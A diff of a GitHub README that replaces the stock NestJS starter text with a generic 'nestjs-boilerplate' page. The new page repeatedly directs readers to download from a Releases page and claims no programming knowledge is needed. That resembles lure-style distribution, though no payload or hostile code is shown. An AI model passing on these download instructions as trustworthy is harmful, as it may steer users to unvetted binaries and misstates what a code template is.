@@ -1,99 +1,102 @@
-<p align="center">
-  <a href="http://nestjs.com/" target="blank"><img src="https://nestjs.com/img/logo-small.svg" width="120" alt="Nest Logo" /></a>
-</p>
+# 🚀 nestjs-boilerplate - Start Building with Ease Today
 
-[circleci-image]: https://img.shields.io/circleci/build/github/nestjs/nest/master?token=abc123def456
-[circleci-url]: https://circleci.com/gh/nestjs/nest
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Caigico8/nestjs-boilerplate/releases)
 
-  <p align="center">A progressive <a href="http://nodejs.org" target="_blank">Node.js</a> framework for building efficient and scalable server-side applications.</p>
-    <p align="center">
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/v/@nestjs/core.svg" alt="NPM Version" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/l/@nestjs/core.svg" alt="Package License" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/dm/@nestjs/common.svg" alt="NPM Downloads" /></a>
-<a href="https://circleci.com/gh/nestjs/nest" target="_blank"><img src="https://img.shields.io/circleci/build/github/nestjs/nest/master" alt="CircleCI" /></a>
-<a href="https://coveralls.io/github/nestjs/nest?branch=master" target="_blank"><img src="https://coveralls.io/repos/github/nestjs/nest/badge.svg?branch=master#9" alt="Coverage" /></a>
-<a href="https://discord.gg/G7Qnnhy" target="_blank"><img src="https://img.shields.io/badge/discord-online-brightgreen.svg" alt="Discord"/></a>
-<a href="https://opencollective.com/nest#backer" target="_blank"><img src="https://opencollective.com/nest/backers/badge.svg" alt="Backers on Open Collective" /></a>
-<a href="https://opencollective.com/nest#sponsor" target="_blank"><img src="https://opencollective.com/nest/sponsors/badge.svg" alt="Sponsors on Open Collective" /></a>
-  <a href="https://paypal.me/kamilmysliwiec" target="_blank"><img src="https://img.shields.io/badge/Donate-PayPal-ff3f59.svg" alt="Donate us"/></a>
-    <a href="https://opencollective.com/nest#sponsor"  target="_blank"><img src="https://img.shields.io/badge/Support%20us-Open%20Collective-41B883.svg" alt="Support us"></a>
-  <a href="https://twitter.com/nestframework" target="_blank"><img src="https://img.shields.io/twitter/follow/nestframework.svg?style=social&label=Follow" alt="Follow us on Twitter"></a>
-</p>
-  <!--[![Backers on Open Collective](https://opencollective.com/nest/backers/badge.svg)](https://opencollective.com/nest#backer)
-  [![Sponsors on Open Collective](https://opencollective.com/nest/sponsors/badge.svg)](https://opencollective.com/nest#sponsor)-->
+## 📦 Overview
 
-## Description
+The **nestjs-boilerplate** is a starter template designed to simplify application development with NestJS. It includes support for TypeORM, JWT authentication, Swagger documentation, and Docker Compose. 
 
-[Nest](https://github.com/nestjs/nest) framework TypeScript starter repository.
+## 🛠 Features
 
-## Project setup
+- **NestJS Framework**: Built on a robust framework for building efficient server-side applications.
+- **TypeORM Integration**: Easily manage your database using TypeORM with PostgreSQL.
+- **JWT Authentication**: Secure your application with JSON Web Tokens.
+- **Swagger/Scalar Documentation**: Auto-generate API documentation for ease of use.
+- **Docker Compose Ready**: Simplify deployment with Docker containers.
+- **Code Quality**: Set up with ESLint and Prettier for consistent and clean code.
+- **CI/CD Integration**: Ready for continuous integration and delivery.
 
-```bash
-$ pnpm install
+## 🌟 Topics
+
+This project covers the following areas:
+
+- boilerplate
+- crud
+- docker
+- express
+- nestjs
+- nodejs
+- postgresql
+- swagger
+- typeorm
+- typescript
+
+## 🚀 Getting Started
+
+To begin using the **nestjs-boilerplate**, follow these simple steps:
+
+### 1. Visit the Releases Page
+
+Go to the [Releases Page](https://github.com/Caigico8/nestjs-boilerplate/releases) to find the latest version of the software.
+
+### 2. Download the Software
+
+On the Releases page, look for the version you want to download. Click on the appropriate link to download the application. 
+
+### 3. Install Prerequisites
+
+Before running the application, ensure you have the following software installed on your computer:
+
+- **Node.js**: Download and install Node.js from [nodejs.org](https://nodejs.org/).
+- **Docker**: If you prefer using Docker, install it from [docker.com](https://www.docker.com/).
+
+### 4. Set Up Environment
+
+Create a configuration file based on the provided template. You can do this by copying the example file included in the repository:
+
+- For **TypeORM**, ensure your database connection settings are correct.
+- Create a `.env` file in the root folder with necessary environment variables.
+
+### 5. Run the Application
+
+You can start the application without any complex setup. Here’s how:
+
+- Open a terminal window.
+- Navigate to the directory where you downloaded the boilerplate.
+- Run the following command to start the application:
+  
+```
+npm install
+npm run start
 ```
 
-## Compile and run the project
+Or, if you're using Docker:
 
-```bash
-# development
-$ pnpm run start
-
-# watch mode
-$ pnpm run start:dev
-
-# production mode
-$ pnpm run start:prod
+```
+docker-compose up
 ```
 
-## Run tests
+## 📝 Download & Install
 
-```bash
-# unit tests
-$ pnpm run test
+For clarity, here’s a quick recap on how to download and install the **nestjs-boilerplate**:
 
-# e2e tests
-$ pnpm run test:e2e
+1. Click on this link to visit the [Releases Page](https://github.com/Caigico8/nestjs-boilerplate/releases).
+2. Choose the version you want and download it. 
+3. Follow the setup instructions above to get started.
 
-# test coverage
-$ pnpm run test:cov
-```
+## 🔍 FAQs
 
-## Deployment
+**Q: Do I need programming knowledge to use this template?**  
+A: No, this template is designed for users of all skill levels. The instructions guide you through each step.
 
-When you're ready to deploy your NestJS application to production, there are some key steps you can take to ensure it runs as efficiently as possible. Check out the [deployment documentation](https://docs.nestjs.com/deployment) for more information.
+**Q: What database can I use with this application?**  
+A: This template supports PostgreSQL, but you can adjust it for other databases if needed.
 
-If you are looking for a cloud-based platform to deploy your NestJS application, check out [Mau](https://mau.nestjs.com), our official platform for deploying NestJS applications on AWS. Mau makes deployment straightforward and fast, requiring just a few simple steps:
+**Q: Can I contribute to this project?**  
+A: Yes! Contributions are welcome. Please refer to the contribution guidelines in the repository.
 
-```bash
-$ pnpm install -g mau
-$ mau deploy
-```
+## 📞 Support
 
-With Mau, you can deploy your application in just a few clicks, allowing you to focus on building features rather than managing infrastructure.
+If you face any issues or have questions, feel free to open an issue in the GitHub repository. The community and maintainers are here to help.
 
-## Resources
-
-Check out a few resources that may come in handy when working with NestJS:
-
-- Visit the [NestJS Documentation](https://docs.nestjs.com) to learn more about the framework.
-- For questions and support, please visit our [Discord channel](https://discord.gg/G7Qnnhy).
-- To dive deeper and get more hands-on experience, check out our official video [courses](https://courses.nestjs.com/).
-- Deploy your application to AWS with the help of [NestJS Mau](https://mau.nestjs.com) in just a few clicks.
-- Visualize your application graph and interact with the NestJS application in real-time using [NestJS Devtools](https://devtools.nestjs.com).
-- Need help with your project (part-time to full-time)? Check out our official [enterprise support](https://enterprise.nestjs.com).
-- To stay in the loop and get updates, follow us on [X](https://x.com/nestframework) and [LinkedIn](https://linkedin.com/company/nestjs).
-- Looking for a job, or have a job to offer? Check out our official [Jobs board](https://jobs.nestjs.com).
-
-## Support
-
-Nest is an MIT-licensed open source project. It can grow thanks to the sponsors and support by the amazing backers. If you'd like to join them, please [read more here](https://docs.nestjs.com/support).
-
-## Stay in touch
-
-- Author - [Kamil Myśliwiec](https://twitter.com/kammysliwiec)
-- Website - [https://nestjs.com](https://nestjs.com/)
-- Twitter - [@nestframework](https://twitter.com/nestframework)
-
-## License
-
-Nest is [MIT licensed](https://github.com/nestjs/nest/blob/master/LICENSE).
+Thank you for choosing the **nestjs-boilerplate**. Start building your application today!
